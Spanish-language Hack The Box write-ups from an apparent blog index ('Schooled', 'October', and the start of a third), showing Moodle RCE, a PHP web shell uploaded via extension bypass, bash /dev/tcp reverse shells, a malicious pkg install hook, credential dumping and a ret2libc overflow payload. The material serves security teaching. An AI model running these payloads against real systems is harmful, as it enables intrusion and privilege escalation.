manager role to RCE [+] Login on site: MoodleSession:4ai0o3jlkpct1pcv6a2go5c687 ✓ [+] Updating roles to move on manager accout: ✓ [+] Updating rol manager to enable install plugins: ✓ [+] Uploading malicious .zip file: ✓ [+] Executing whoami: ✓ www [+] Keep breaking ev3rYthiNg!! El exploit ha funcionado!\nPara recibir la reverse shell nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Por último aprovechándonos del plugin que ha subido el exploit para ejecutar comandos vamos a ejecutar el comando para mandarnos la reverse shell\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.8/443 0\u0026gt;\u0026amp;1\u0026#34; curl \u0026#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.8%2F443%200%3E%261%27\u0026#34; Escalada de privilegios Para mejorar la consola vamos a usar el típico comando python3 -c 'import pty;pty.spawn(\u0026quot;bash\u0026quot;)'\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; bash: python3: command not found [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ which python3 [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ which python Parece que python no está instalado, pero sí los buscamos con find sí que existe\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ find / -name python3 2\u0026gt;/dev/null /usr/local/bin/python3 Esto se debe a que /usr/local/bin no está en el path\n[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ echo $PATH /sbin:/bin:/usr/sbin:/usr/bin Así que para ejecutar el comando anterior necesitamos especificar la ruta completa\n/usr/local/bin/python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; [www@Schooled /]$ ^Z zsh: suspended nc -nlvp 443 \u0026gt; stty raw -echo; fg [1] + continued nc -nlvp 443 reset Ahora ya tenemos una shell en condiciones, pero aún no podemos hacer ctrl + l, para solucionarlo, ejecutamos lo siguiente para hacer que TERM valga xterm y SHELL valga bash\n[www@Schooled /]$ export TERM=xterm [www@Schooled /]$ export SHELL=bash Dentro del archivo config.php de moodle encontramos las credenciales de la base de datos\n[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php \u0026lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u0026gt;dbtype = \u0026#39;mysqli\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;PlaybookMaster2020\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( Nos conectamos\nmysql -u moodle -p Seleccionamos la base de datos moodle\nmoodle@localhost [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | moodle | +--------------------+ moodle@localhost [(none)]\u0026gt; use moddle Después consultamos la tabla de users\nmoodle@localhost [moodle]\u0026gt; select * from mdl_user; Dentro hay un usuario llamado Jamie que casualmente también existe en el sistema\n[www@Schooled /usr/local/www/apache24/data/moodle]$ cat /etc/passwd | grep jamie jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh Así que lo que vamos a hacer es sacar su hash de la base de datos y guardarlo en un archivo llamado hash, para posteriormente romperlo con john\n\u0026gt; john --wordlist=/usr/share/wordlists/rockyou.txt hash Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status !QAZ2wsx (?) Ahora ya tenemos su contraseña, lo que podemos comprobar es si tiene la misma contraseña para el sistema\n\u0026gt; ssh jamie@schooled.htb (jamie@schooled.htb) Password for jamie@Schooled: jamie@Schooled:~ $ Efectivamente usa la misma contraseña\nCon sudo -l observamos que jaime tiene permisos para ejecutar dos comandos\njamie@Schooled:/tmp $ sudo -l User jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install * Con una búsqueda rápida en gtfobins encontramos que nos podemos aprovechar de pkg para escalar privilegios.\nPara escalar privilegios vamos a crear un paquete para freebsd, que dentro va a contener un comando para mandarnos una reverse shell\nTF=$(mktemp -d) echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.14/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt; $TF/x.sh fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF Este paquete nos lo pasamos a la máquina víctima a través de un servidor con python, por ejemplo.\ncurl 10.10.14.14/x-1.0.txz --output x-1.0.txz Por último nos ponemos en escucha con nc \u0026rsquo;nc -nlvp 443\u0026rsquo; e instalamos el paquete\nsudo pkg install -y --no-repo-update ./x-1.0.txz Recibimos la shell como root!\n\u0026gt; nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.234] 15909 [root@Schooled /tmp]# ","date":"2024-03-28","id":37,"permalink":"/writeups/hackthebox/schooled/","summary":"Explotamos un XSS en un moodle para robar una cookie de sesión, un CVE de modle 3.9 el cual lleva a un RCE, y para la escalada de privilegios, conseguimos ser root a través del comando pkg, debido a unos permisos mal implementados en el /etc/sudoers","tags":["XSS","pkg"],"title":"Schooled"},{"content":"","date":"2024-03-28","id":38,"permalink":"/tags/suid/","summary":"","tags":[],"title":"SUID"},{"content":"","date":"2024-03-28","id":39,"permalink":"/tags/xss/","summary":"","tags":[],"title":"XSS"},{"content":"","date":"2024-03-27","id":40,"permalink":"/tags/aslr-bypass/","summary":"","tags":[],"title":"ASLR bypass"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.16 PING 10.10.10.16 (10.10.10.16) 56(84) bytes of data. 64 bytes from 10.10.10.16: icmp_seq=1 ttl=63 time=37.4 ms --- 10.10.10.16 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 37.437/37.437/37.437/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.16 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.16 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; sudo nmap -sCV -p22,80 10.10.10.16 -Pn -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA) | 2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA) | 256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA) |_ 256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) | http-methods: |_ Potentially risky methods: PUT PATCH DELETE |_http-title: October CMS - Vanilla Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Nmap ha reportado que el puerto 80 está abierto y tiene corriendo una web\nCon un whatweb podemos ver a que nos enfrentamos\n\u0026gt; whatweb http://10.10.10.16 http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21] Es un October CMS, con una búsqueda en google podemos encontrar que este CMS tiene el login en el /backend y que las credenciales por defecto son admin:admin. Si probamos de autenticarnos con estas credenciales\u0026hellip; Funciona, ahora ya estamos dentro del panel de administración\nIntrusión En el panel de administración hay una sección de subida de archivos donde podemos intentar colar un php.\nPrimero intentaremos subir un script básico llamado shell.php con el siguiente código\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Como era de esperar, da error.\nPuede ser que esté bloqueando el archivo basándose en la extensión. El siguiente paso sería probar de mandar el archivo con otras extensiones de php.\n.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nEste proceso lo podemos automatizar con burpsuite desde la sección de intruder.\nEmpezamos seleccionando que valor vamos a alterar, en este caso las extensiones\nSeguimos subiendo un archivo con todas las extensiones que harán de diccionario para la fuerza bruta\n\u0026gt; /usr/bin/cat extensions.txt php php2 php3 php4 php5 php6 php7 phps phps pht phtm phtml pgif shtml htaccess phar inc hphp ctp module Solo falta darle a start atack.\nBurpsuite lo que va a hacer es sustituir la extensión por cada una de las extensiones que le hemos pasado como diccionario. Dando como resultado lo siguiente.\nAquí podemos apreciar que las peticiones que intentan subir un archivo con una extensión bloqueada, dan como resultado un error 400 y las que si han podido subir un archivo devuelven un código 200\nAhora ya podemos acceder a los archivos subidos desde la siguiente ruta\nhttp://10.10.10.16/storage/app/media/ http://10.10.10.16/storage/app/media/shell.php5\nPara ganar acceso a la máquina solo queda ponerse en escucha por el puerto 443.\nnc -nvlp 443 Y mandarnos una reverse shell\ncurl -s -G \u0026#34;http://10.10.10.16/storage/app/media/shell.php5\u0026#34; --data-urlencode \u0026#34;cmd=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.38/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Estamos dentro B)\nAntes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Escalada de privilegios Empezamos la escalada buscando archivos con permisos SUID\nfind / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null ... -rwsr-xr-- 1 root dip 323000 Apr 21 2015 /usr/sbin/pppd -rwsr-sr-x 1 libuuid libuuid 17996 Nov 24 2016 /usr/sbin/uuidd -rwsr-xr-x 1 root root 7377 Apr 21 2017 /usr/local/bin/ovrflw Entre todos los encontrados hay uno que llama la atención y es el /usr/local/bin/ovrflw, para ver que es y analizarlo, nos lo vamos a pasar a nuestra máquina de atacante\nHe intentado pasármelo a mi máquina con un servidor http de python, pero no funciona, así que nos lo pasaremos con base64\nMáquina víctima:\nbase64 ovrflw Guardamos todo el output en base64 en un archivo llamado temp.txt en la máquina atacante y después lo \u0026ldquo;decodeamos\u0026rdquo; y lo guardamos en un archivo llamado ovrflw\nbase64 -d temp.txt \u0026gt; ovrflw Le damos permisos de ejecución\nchmod +x ovrflw Ya podemos empezar a analizarlo\nAl ejecutarlo nos salta un mensaje explicando el uso del programa\n\u0026gt; ./ovrflw Syntax: ./ovrflw \u0026lt;input string\u0026gt; Nos dice que hay que poner un input como parámetro\n./ovrflw a Pero no sale nada cuando ponemos algo.\nEs raro, vamos a ver que esta pasando desde ghidra\nFunción main\nundefined4 main(int param_1,undefined4 *param_2) { char local_74 [112]; if (param_1 \u0026lt; 2) { printf(\u0026#34;Syntax: %s \u0026lt;input string\u0026gt;\\n\u0026#34;,*param_2); /* WARNING: Subroutine does not return */ exit(0); } strcpy(local_74,(char *)param_2[1]); return 0; } 1- Primero se declara una variable con un tamaño de buffer de 112\n2- Se comprueba si hemos proporcionado un parámetro.\n3- Se hace uso de la función strcpy para guardar nuestro input en la variable previamente declarada.\nstrcpy es una función que no es recomendable usar porque si el input es más grande del esperado provoca un desbordamiento del buffer, como en este caso:\n\u0026gt; ./ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39;*200\u0026#34;) zsh: segmentation fault ./ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39;*200\u0026#34;) Vemos el error segmentation fault así que podemos probar de llevar a cabo un buffer overflow\nVamos a comprobar las protecciones del binario para pensar como podríamos explotarlo\n\u0026gt; checksec ./ovrflw [*] \u0026#39;/home/d3b0o/Downloads/ovrflw\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Tiene la protección NX activada por lo que no podemos hacer un Buffer Overflow y cargar shellcode en el stack porque no se va a ejecutar, pero lo que si podemos hacer es un Buffer Overflow ret2libc.\nLo primero es encontrar el offset para llegar al EIP (La cantidad de caracteres que necesitamos poner para llegar a sobreescribir el EIP).\nPara ello usaremos gdb con el plugin pwndbg.\nCreamos una cadena de texto de 500 caracteres\nmsf-pattern_create -l 500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Esta cadena de texto está especialmente diseñada para esto\nSe lo mandamos a pwndbg\npwndbg\u0026gt; r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Starting program: /home/d3b0o/Downloads/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Program received signal SIGSEGV, Segmentation fault. 0x64413764 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────── EAX 0x0 *EBX 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c *ECX 0xffffd290 ◂— \u0026#39;Aq2Aq3Aq4Aq5Aq\u0026#39; *EDX 0xffffcf62 ◂— \u0026#39;Aq2Aq3Aq4Aq5Aq\u0026#39; *EDI 0xf7ffcba0 (_rtld_global_ro) ◂— 0x0 *ESI 0x80484d0 (__libc_csu_init) ◂— push ebp *EBP 0x41366441 (\u0026#39;Ad6A\u0026#39;) *ESP 0xffffcdf0 ◂— 0x39644138 (\u0026#39;8Ad9\u0026#39;) *EIP 0x64413764 (\u0026#39;d7Ad\u0026#39;) ──────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────── Invalid address 0x64413764 El programa obviamente crashea, ya que hemos sobreescrito el EIP con una dirección que no existe y el programa no puede continuar.\nCon el siguiente comando nos calcula automáticamente el offset del EIP\n\u0026gt; msf-pattern_offset -l 500 -q 0x64413764 [*] Exact match at offset 112 Para comprobar que realmente es 112 vamos a mandar 112 \u0026lsquo;A\u0026rsquo; acompañadas de 4 \u0026lsquo;B\u0026rsquo; si todo ha funcionado el EIP debería valer 42424242, ya que B en hexadecimal es 42\npwndbg\u0026gt; r $(python2 -c \u0026#34;print \u0026#39;A\u0026#39; * 112 + \u0026#39;B\u0026#39; * 4\u0026#34;) Starting program: /home/d3b0o/Downloads/ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39; * 112 + \u0026#39;B\u0026#39; * 4\u0026#34;) [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────── EAX 0x0 *EBX 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c *ECX 0xffffd290 ◂— \u0026#39;AAAAAAAAAABBBB\u0026#39; *EDX 0xffffcf62 ◂— \u0026#39;AAAAAAAAAABBBB\u0026#39; *EDI 0xf7ffcba0 (_rtld_global_ro) ◂— 0x0 *ESI 0x80484d0 (__libc_csu_init) ◂— push ebp *EBP 0x41414141 (\u0026#39;AAAA\u0026#39;) *ESP 0xffffcf70 ◂— 0x0 *EIP 0x42424242 (\u0026#39;BBBB\u0026#39;) ──────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────── Invalid address 0x42424242 Efectivamente funciona.\nEl siguiente paso para explotar el ret2libc es comprobar si el ASLR está activado.\nASLR: Aleatorización de las direcciones de la memoria. Esta protección no es del programa en sí, es una protección del sistema. En los sistemas actuales suele ser raro encontrarlo deshabilitado. Para ver si está habilitado le hacemos un cat al /proc/sys/kernel/randomize_va_space. Si el contenido es un 0, es que está deshabilitado, si no devuelve un 0 es que está habilitado\nwww-data@october:/usr/local/bin$ cat /proc/sys/kernel/randomize_va_space 2 En este caso está habilitado, otra forma de comprobarlo sería viendo varias veces con un bucle la dirección del libc .\nwww-data@october:/usr/local/bin$ for i in `seq 0 20`; do ldd ovrflw | grep libc; done libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7589000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75a5000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75bb000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d0000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75bf000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75b0000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb761c000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb755d000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d1000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7574000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb756e000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb759f000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75fb000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7595000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb755a000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7548000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7621000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb759b000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75c8000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb757a000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7582000) Podemos observar que va cambiando\nEsto nos dificultará un poco la explotación.\nEl siguiente paso es encontrar las direcciones de system, /bin/sh y de forma opcional exit, lo que vamos a hacer es llamar a la función system y como parámetros le pasaremos /bin/sh para tener una sh ejecutada por root\n(Desde la máquina víctima)\n/bin/sh strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep \u0026#34;/bin/sh\u0026#34; 162bac /bin/sh system y exit readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e \u0026#34; system@\u0026#34; -e \u0026#34; exit@\u0026#34; 139: 00033260 45 FUNC GLOBAL DEFAULT 12 exit@@GLIBC_2.0 1443: 00040310 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 También pillaremos una dirección de libc como esta, porejemplo 0xb75f5000\nCalculamos las direcciones:\nlibc = 0xb75f5000 #SYSTEM system = hex(libc + 0x40310) #EXIT exit = hex(libc + 0x33260) #/bin/sh sh = hex(libc + 0x162bac) print(system, exit, sh) \u0026gt; python3 bof.py 0xb7635310 0xb7628260 0xb7757bac Ya tenemos las 3 direcciones, pero necesitamos pasarlas a little endian\nSystem: 0xb7635310 -\u0026gt; \\x10\\x53\\x63\\xb7 Exit: 0xb7628260 -\u0026gt; \\x60\\x82\\x62\\xb7 /bin/sh: 0xb7757bac -\u0026gt; \\xac\\x7b\\x75\\xb7 El payload final quedaría de la siguiente forma\n./ovrflw $(python2 -c \u0026#34;b\u0026#39;A\u0026#39; * 112 + b\u0026#39;\\x10\\x53\\x63\\xb7\u0026#39; + b\u0026#39;\\x60\\x82\\x62\\xb7\u0026#39; + b\u0026#39;\\xac\\x7b\\x75\\xb7\u0026#39;\u0026#34;) La idea está bien, pero esto no funcionaria porque no estamos teniendo en cuenta el ASLR, ya que estamos suponiendo que la dirección de libc es 0xb75f5000\nLo que podríamos hacer es ejecutar con un bucle inifinito el script, porque en algún momento la librería libc volverá a tener la dirección 0xb75f5000\nwhile true; do /usr/local/bin/ovrflw $(python -c \u0026#39;print b\u0026#34;A\u0026#34;*112 + \u0026#34;\\x10\\x53\\x63\\xb7\u0026#34; + \u0026#34;\\x60\\x82\\x62\\xb7\u0026#34; + \u0026#34;\\xac\\x7b\\x75\\xb7\u0026#34;\u0026#39;); done Segmentation fault (core dumped) Segmentation fault (core dumped) Segmentation fault (core dumped) Segmentation fault (core dumped) # whoami root Alcabo de un rato, somos root\n","date":"2024-03-27","id":41,"permalink":"/writeups/hackthebox/october/","summary":"En esta máquina explotaremos un OctoberCMS con unas credenciales por defecto y una subida de archivos saltándonos una validación por extensión. En la escalada llevaremos a cabo un Buffer Overflow con una técnica llamada ret2libc con el ASLR (Aleatorización de las direcciones de la memoria.) activado","tags":["OctoberCMS","ret2libc","ASLR bypass"],"title":"October"},{"content":"","date":"2024-03-27","id":42,"permalink":"/tags/octobercms/","summary":"","tags":[],"title":"OctoberCMS"},{"content":"","date":"2024-03-27","id":43,"permalink":"/tags/ret2libc/","summary":"","tags":[],"title":"ret2libc"},{"content":"","date":"2024-03-18","id":44,"permalink":"/tags/bof/","summary":"","tags":[],"title":"BoF"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.198 PING 10.10.10.198 (10.10.10.198) 56(84) bytes of data. 64 bytes from 10.10.10.198: icmp_seq=1 ttl=127 time=304 ms --- 10.10.10.198 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 303.579/303.579/303.579/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.198 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.198 5 │ [*] Open ports: 8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\nnmap -sCV -p8080 10.10.10.198 -Pn -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 12:58 CET Nmap scan report for 10.10.10.198 Host is up (0.39s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 8080 Nmap ha reportado que el puerto 8080 está abierto con una web hecha en Apache 2.4.42.\nAl entrar vemos una web simple sobre un gimnasio, si vamos al apartado de contacto vemos el siguiente mensaje.\nMade using Gym Management Software 1.0\nIntrusión Con una búsqueda en exploit-db vemos que es vulnerable a un RCE sin necesidad de estar autenticados\n\u0026gt; searchsploit gym -------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------- --------------------------------- Gym Management System 1.0 - 